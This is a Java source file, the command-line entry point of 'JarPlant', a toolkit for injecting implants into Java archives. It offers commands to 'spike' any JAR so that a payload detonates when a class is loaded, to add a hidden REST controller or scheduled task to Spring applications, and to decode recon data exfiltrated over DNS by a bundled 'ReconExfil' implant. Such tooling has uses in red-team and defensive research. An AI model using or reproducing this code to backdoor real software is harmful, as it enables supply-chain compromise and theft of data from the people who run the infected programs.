package org.example;

import net.sourceforge.argparse4j.ArgumentParsers;
import net.sourceforge.argparse4j.impl.Arguments;
import net.sourceforge.argparse4j.inf.*;
import org.example.implants.*;
import org.example.implants.utils.ReconExfilDecoder;
import org.example.injector.*;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static net.sourceforge.argparse4j.impl.Arguments.storeTrue;

public class Cli {
    // Credz: 'Square' font by Chris Gill, 30-JUN-94 -- based on .sig of Jeb Hagan.
    private final static String banner =
            "       _____               ______  __                __   \n" +
                    "     _|     |.---.-..----.|   __ \\|  |.---.-..-----.|  |_ \n" +
                    "    |       ||  _  ||   _||    __/|  ||  _  ||     ||   _|\n" +
                    "    |_______||___._||__|  |___|   |__||___._||__|__||____|\n" +
                    "    Java archive implant toolkit   v0.1   by w1th4d & kugg";

    private final static String examples = "for more options, see command help pages:\n" +
            "  $ java -jar jarplant.jar class-injector -h\n" +
            "  $ java -jar jarplant.jar spring-injector -h\n" +
            "    ...\n\n" +
            "example usage:\n" +
            "  $ java -jar jarplant.jar class-injector \\\n" +
            "    --target path/to/target.jar --output spiked-target.jar";

    enum Command {
        CLASS_INJECTOR, SPRING_INJECTOR, IMPLANT_LIST, IMPLANT_INFO, DECODER
    }

    public static void main(String[] args) {
        ArgumentParser parser = ArgumentParsers.newFor("java -jar jarplant.jar").build()
                .defaultHelp(true)
                .description(banner)
                .epilog(examples);
        Subparsers subparsers = parser.addSubparsers()
                .metavar("command");

        Subparser classInjectorParser = subparsers.addParser("class-injector")
                .help("Inject a class implant into any JAR. The implant will detonate whenever any class in the JAR is used but the payload will only run once (or possibly twice in some very fringe cases). This is the most versatile implant type and works with any JAR (even ones without a main function, like a library).")
                .description(banner)
                .setDefault("command", Command.CLASS_INJECTOR);
        classInjectorParser.addArgument("--target", "-t")
                .help("Path to the JAR file to spike.")
                .metavar("JAR")
                .type(Arguments.fileType().acceptSystemIn().verifyExists().verifyCanRead())
                .required(true);
        classInjectorParser.addArgument("--output", "-o")
                .help("Path to where the spiked JAR will be written. Should not be the same file as the target.")
                .metavar("JAR")
                .type(Arguments.fileType().verifyCanCreate())
                .required(true);
        classInjectorParser.addArgument("--implant-class")
                .help("Name of the class containing a custom 'init()' method and other implant logic.")
                .choices("ClassImplant", "ReconExfil")
                .setDefault("ClassImplant");
        classInjectorParser.addArgument("--config")
                .help("Override one or more configuration properties inside the implant.")
                .metavar("KEY=VALUE")
                .nargs("*")
                .type(String.class);

        Subparser springInjectorParser = subparsers.addParser("spring-injector")
                .help("Inject a Spring component implant into JAR-packaged Spring application. The component will be loaded and included in the Spring context. The component could be something like an extra REST controller or scheduled task.")
                .description(banner)
                .setDefault("command", Command.SPRING_INJECTOR);
        springInjectorParser.addArgument("--target", "-t")
                .help("Path to the JAR file to spike.")
                .metavar("JAR")
                .type(Arguments.fileType().acceptSystemIn().verifyExists().verifyCanRead())
                .required(true);
        springInjectorParser.addArgument("--output", "-o")
                .help("Path to where the spiked JAR will be written. Should not be the same file as the target.")
                .metavar("JAR")
                .type(Arguments.fileType().verifyCanCreate())
                .required(true);
        springInjectorParser.addArgument("--implant-component")
                .help("Name of the Spring component to inject into the class. This will typically be a '@RestController' class.")
                .choices("SpringImplantController")
                .setDefault("SpringImplantController");
        springInjectorParser.addArgument("--implant-config")
                .help("Name of the Spring configuration class to use as a template in case the target Spring config needs to be modified. Only the '@Bean' annotated methods in this class will be copied to the target config.")
                .choices("SpringImplantConfiguration")
                .setDefault("SpringImplantConfiguration");

        Subparser implantListParser = subparsers.addParser("implant-list")
                .help("List all bundled implants.")
                .description(banner)
                .setDefault("command", Command.IMPLANT_LIST);

        Subparser implantInfoParser = subparsers.addParser("implant-info")
                .help("See more details about a specific implant. This includes reading its class to see all available configuration properties and their data types. A class file path can be specified to read a custom implant.")
                .description(banner)
                .setDefault("command", Command.IMPLANT_INFO);
        implantInfoParser.addArgument("implant")
                .help("Implant to list details about. Can be a name of a bundled implant or a path to a class file (or a mix of both).")
                .metavar("IMPLANT")
                .type(String.class)
                .nargs("*")
                .required(false);

        Subparser decoderParser = subparsers.addParser("decoder")
                .help("Utility to decode stuff generated by some of the built-in payloads.")
                .description(banner)
                .setDefault("command", Command.DECODER);
        decoderParser.addArgument("--verbose", "-v")
                .help("Print more than just the output data.")
                .type(Boolean.class)
                .action(storeTrue())
                .setDefault(false);
        decoderParser.addArgument("--input-file", "-i")
                .help("Path to the JAR file to spike.")
                .metavar("FILE")
                .type(Arguments.fileType().acceptSystemIn().verifyExists().verifyCanRead())
                .required(false);
        decoderParser.addArgument("--top-domain", "-d")
                .help("Your top domain used in CONFIG_EXFIL_DNS.")
                .metavar("DOMAIN")
                .type(String.class)
                .required(true);
        decoderParser.addArgument("input")
                .help("Raw input data.")
                .metavar("INPUT")
                .type(String.class)
                .nargs("*")
                .required(false);

        Namespace namespace;
        try {
            namespace = parser.parseArgs(args);
        } catch (ArgumentParserException e) {
            parser.handleError(e);
            System.exit(1);
            throw new RuntimeException("Unreachable");
        }

        Command command = namespace.get("command");
        switch (command) {
            case CLASS_INJECTOR -> classInjector(namespace);
            case SPRING_INJECTOR -> springInjector(namespace);
            case IMPLANT_LIST -> listImplants();
            case IMPLANT_INFO -> printImplantInfo(namespace);
            case DECODER -> decodeStuff(namespace);
            default -> {
                parser.printHelp();
                System.exit(1);
            }
        }
    }

    private static void classInjector(Namespace namespace) {
        Path targetPath = Path.of(namespace.getString("target"));
        Path outputPath = Path.of(namespace.getString("output"));
        assertNotSameFile(targetPath, outputPath);

        String implantClassName = namespace.getString("implant_class");
        ImplantHandler implantHandler;
        if (implantClassName.equals("ClassImplant")) {
            try {
                implantHandler = ImplantHandlerImpl.findAndCreateFor(ClassImplant.class);
            } catch (ClassNotFoundException | IOException e) {
                throw new RuntimeException("Cannot find built-in implant class.", e);
            }
        } else if (implantClassName.equals("ReconExfil")) {
            try {
                implantHandler = ImplantHandlerImpl.findAndCreateFor(ReconExfil.class);
            } catch (ClassNotFoundException | IOException e) {
                throw new RuntimeException("Cannot find built-in implant class.", e);
            }
        } else {
            System.out.println("[!] Unknown --implant-class.");
            System.exit(1);
            throw new RuntimeException();
        }

        Map<String, Object> configOverrides = parseConfigOverrides(namespace);
        try {
            implantHandler.setConfig(configOverrides);
        } catch (ImplantConfigException e) {
            System.out.println("[!] " + e.getMessage());
            System.exit(1);
        }

        runClassInjector(targetPath, outputPath, implantHandler);
    }

    public static void runClassInjector(Path targetPath, Path outputPath, ImplantHandler implantHandler) {
        ClassInjector injector = new ClassInjector(implantHandler);

        System.out.println(banner);
        System.out.println();

        System.out.println("[i] Implant class: " + implantHandler.getImplantClassName());
        System.out.println("[i] Target JAR: " + targetPath);
        System.out.println("[i] Output JAR: " + outputPath);
        System.out.println();

        System.out.println("[+] Reading available implant config properties...");
        Map<String, ImplantHandlerImpl.ConfDataType> availableConfig = implantHandler.getAvailableConfig();
        for (Map.Entry<String, ImplantHandlerImpl.ConfDataType> entry : availableConfig.entrySet()) {
            System.out.println("[i] " + entry.getKey() + " (" + entry.getValue() + ")");
        }

        try {
            boolean didInfect = injector.infect(targetPath, outputPath);

            if (didInfect) {
                System.out.println("[+] Infected '" + targetPath + "'.");
                System.out.println();
                System.out.println("[i] Spiked JAR available at: " + outputPath);
            } else {
                System.out.println("[-] Did not infect '" + targetPath + "'.");
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    private static void springInjector(Namespace namespace) {
        Path targetPath = Path.of(namespace.getString("target"));
        Path outputPath = Path.of(namespace.getString("output"));
        assertNotSameFile(targetPath, outputPath);

        String implantComponent = namespace.getString("implant_component");
        String implantConfClass = namespace.getString("implant_config");
        if (implantComponent.equals("SpringImplantController") && implantConfClass.equals("SpringImplantConfiguration")) {
            ImplantHandler componentHandler;
            ImplantHandler springConfigHandler;
            try {
                componentHandler = ImplantHandlerImpl.findAndCreateFor(SpringImplantController.class);
                springConfigHandler = ImplantHandlerImpl.findAndCreateFor(SpringImplantConfiguration.class);
            } catch (ClassNotFoundException | IOException e) {
                throw new RuntimeException("Cannot find built-in implant class.", e);
            }

            Map<String, Object> configOverrides = parseConfigOverrides(namespace);
            try {
                componentHandler.setConfig(configOverrides);
            } catch (ImplantConfigException e) {
                System.out.println("[!] " + e.getMessage());
                System.exit(1);
            }

            runSpringInjector(targetPath, outputPath, componentHandler, springConfigHandler);
        } else {
            System.out.println("[!] Unknown --implant-component or --implant-config.");
            System.exit(1);
        }
    }

    public static void runSpringInjector(Path targetPath, Path outputPath, ImplantHandler componentHandler, ImplantHandler springConfigHandler) {
        SpringInjector injector = new SpringInjector(componentHandler, springConfigHandler);

        System.out.println(banner);
        System.out.println();

        System.out.println("[i] Implant Spring component: " + componentHandler.getImplantClassName());
        System.out.println("[i] Implant Spring config class: " + componentHandler.getImplantClassName());
        System.out.println("[i] Target JAR: " + targetPath);
        System.out.println("[i] Output JAR: " + outputPath);
        System.out.println();

        try {
            boolean didInfect = injector.infect(targetPath, outputPath);
            if (didInfect) {
                System.out.println("[+] Infected '" + targetPath + "'. Modified JAR available at: " + outputPath);
                System.out.println();
                System.out.println("[i] Spiked JAR available at: " + outputPath);
            } else {
                System.out.println("[-] Did not infect '" + targetPath + "'.");
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    private static Map<String, Object> parseConfigOverrides(Namespace namespace) {
        Map<String, Object> config = new HashMap<>();

        ArrayList<String> configArgs = namespace.get("config");
        if (configArgs == null) {
            return Collections.emptyMap();
        }

        Pattern regex = Pattern.compile("^(?<key>\\w+)=(?<value>[\\w\\\\.\\-_ ]+)$");
        for (String configArg : configArgs) {
            Matcher match = regex.matcher(configArg);
            if (!match.matches()) {
                System.out.println("[!] Each config entry must be in the format KEY=VALUE. Example: CONF_LOCAL_PORT=1234");
                System.exit(1);
            }
            String key = match.group("key");
            String value = match.group("value");
            if (key == null && value == null) {
                throw new RuntimeException("Internal error: Regex groups does not exist despite a match.");
            }

            config.put(key, value);
        }

        return config;
    }

    private static void listImplants() {
        System.out.println(banner);
        System.out.println();

        System.out.println("[+] Bundled implants:");
        for (ImplantInfo info : ImplantInfo.values()) {
            System.out.println("[+]   " + info.name() + ": " + info.summary);
        }
    }

    private static void printImplantInfo(Namespace namespace) {
        System.out.println(banner);
        System.out.println();

        List<String> implants = namespace.getList("implant");
        for (String implant : implants) {
            ImplantHandler implantHandler;
            try {
                ImplantInfo bundled = ImplantInfo.valueOf(implant);
                implantHandler = ImplantHandlerImpl.findAndCreateFor(bundled.clazz);
                System.out.println("[i] Bundled implant '" + implant + "':");
            } catch (ClassNotFoundException | IOException e) {
                throw new RuntimeException("Failed to read bundled implant: " + e.getMessage());
            } catch (IllegalArgumentException e) {
                // This is Javas way of saying that no enum value was found
                // Try interpreting this as a file instead
                try {
                    Path classFilePath = Path.of(implant);
                    if (!Files.exists(classFilePath)) {
                        System.out.println("[!] Implant not found: " + implant);
                        System.out.println();
                        continue;
                    }
                    implantHandler = ImplantHandlerImpl.createFor(classFilePath);
                    System.out.println("[i] File '" + implant + "':");
                } catch (IOException e2) {
                    System.out.println("[!] Failed to read class file: " + e2.getMessage());
                    System.out.println();
                    continue;
                }
            }

            System.out.println("[i]   Class: " + implantHandler.getImplantClassName());
            System.out.println("[i]   Available configuration properties:");
            for (Map.Entry<String, ImplantHandlerImpl.ConfDataType> entry : implantHandler.getAvailableConfig().entrySet()) {
                System.out.println("[i]     " + entry.getKey() + " (" + entry.getValue() + ")");
            }
            System.out.println();
        }
    }

    private static void decodeStuff(Namespace namespace) {
        boolean verbose = namespace.getBoolean("verbose");
        String topDomain = namespace.getString("top_domain");

        String inputFile = namespace.getString("input_file");
        if (inputFile != null) {
            List<String> inputs;
            try {
                inputs = Files.readAllLines(Path.of(inputFile));
                if (verbose) {
                    System.out.println("[+] Using input file: " + inputFile);
                }
            } catch (IOException e) {
                System.out.println("[!] Failed to read input file: " + inputFile);
                System.exit(1);
                return;
            }
            for (String input : inputs) {
                Optional<Map<String, String>> decoded = ReconExfilDecoder.decode(input, topDomain);
                if (decoded.isEmpty()) {
                    if (verbose) {
                        System.out.println("[-] Could not parse: " + input);
                    }
                } else {
                    Map<String, String> fields = decoded.get();
                    String json = toJson(fields);
                    System.out.println(json);
                }
            }
        }

        ArrayList<String> rawInputs = namespace.get("input");
        if (rawInputs != null) {
            for (String rawInput : rawInputs) {
                Optional<Map<String, String>> decoded = ReconExfilDecoder.decode(rawInput, topDomain);
                if (decoded.isEmpty()) {
                    if (verbose) {
                        System.out.println("[-] Could not parse: " + rawInput);
                    }
                } else {
                    String json = toJson(decoded.get());
                    System.out.println(json);
                }
            }
        }
    }

    // Keep it simple and dependency-free for now
    private static String toJson(Map<String, String> kv) {
        StringBuilder json = new StringBuilder("{");
        boolean isFirstEntry = true;
        for (Map.Entry<String, String> entry : kv.entrySet()) {
            if (!isFirstEntry) {
                json.append(", ");
            } else {
                isFirstEntry = false;
            }

            json.append("\"");
            json.append(entry.getKey().replace("\"", "\\\""));
            json.append("\": \"");
            json.append(entry.getValue().replace("\"", "\\\""));
            json.append("\"");
        }
        json.append("}");

        return json.toString();
    }

    private static void assertNotSameFile(Path target, Path output) {
        try {
            if (Files.exists(output) && target.toRealPath().equals(output.toRealPath())) {
                System.out.println("[!] Target JAR and output JAR cannot be the same.");
                System.exit(1);
            }
        } catch (IOException e) {
            System.out.println("[!] Cannot read file: " + e.getMessage());
        }
    }
}
